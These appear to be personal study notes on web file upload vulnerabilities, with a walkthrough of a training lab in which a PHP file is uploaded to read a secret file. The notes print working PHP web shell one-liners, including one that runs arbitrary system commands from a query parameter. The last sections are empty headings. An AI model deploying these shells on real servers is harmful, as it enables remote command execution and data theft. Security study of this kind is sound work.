File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead.

# Impact of file upload vulnerabilities
RCE	Uploading web shells to run system commands
Data Theft	Reading configs, databases, secrets
Malware Distribution	Hosting malware or backdoors
XSS / Client Attacks	Uploading malicious HTML/SVG/JS files
Auth Bypass	Replacing or hijacking authentication mechanisms
DoS	Crashing services or filling disk space
Persistent Backdoors	Maintaining long-term control
Reputation Damage	Blacklisting, SEO damage, legal risks

# How Web Servers Handle Requests for Static Files
What are Static Files?
Static files are files that don’t change when different users request them. These include:
Images (.jpg, .png)
CSS stylesheets (.css)
JavaScript files (.js)
Fonts, PDFs, videos, etc.
They are not processed by the backend — they are just fetched and served.
How Web Servers Handle Static File Requests:
1. Parse the URL Path - Maps it to a file path on the server’s filesystem.
2. Identify File Extension
3. Map Extension to MIME Type - Server uses config to assign a Content-Type header.
4. Serve or Execute Based on Type & Server Config:
- Non-executable (static): File is sent directly (e.g., image, HTML).
- Executable + execution allowed: File is processed (e.g., .php → PHP interpreter).
- Executable + execution not allowed:
Server throws an error Or Sends raw source code (leads to information disclosure).

Key Headers:
Content-Type: Shows MIME type of file (e.g., text/html, image/png).


Web shell
A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.

# Exploiting unrestricted file uploads to deploy a web shell:
1. The following PHP one-liner could be used to read arbitrary files from the server's filesystem
<?php echo file_get_contents('/path/to/target/file'); ?> 
Once uploaded, sending a request for this malicious file will return the target file's contents in the response. 
2.A more versatile web shell may look something like this:
<?php echo system($_GET['command']); ?>
This script enables you to pass an arbitrary system command via a query parameter as follows:
GET /example/exploit.php?command=id HTTP/1.1


# lab 001
Remote code execution via web shell upload
ques: This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem. 
How to proceed
1. upload a basic PHP web shell
2. use it to exfiltrate the contents of the file /home/carlos/secret
How did I do it 
1. Under HTTP history filter window, Under Filter by MIME type, we enabled the Images checkbox. Upload any random image. 
2. Image was fetched using a GET request to /files/avatars/<YOUR-IMAGE>
3. Created exploit.php, containing a script for fetching the contents of Carlos's secret file.
<?php echo file_get_contents('/home/carlos/secret'); ?> and then uplod it. 
4. Change the path of the request to point to your PHP file:
GET /files/avatars/exploit.php HTTP/1.1


#  Exploiting Flawed validation of file upload




# lab 002
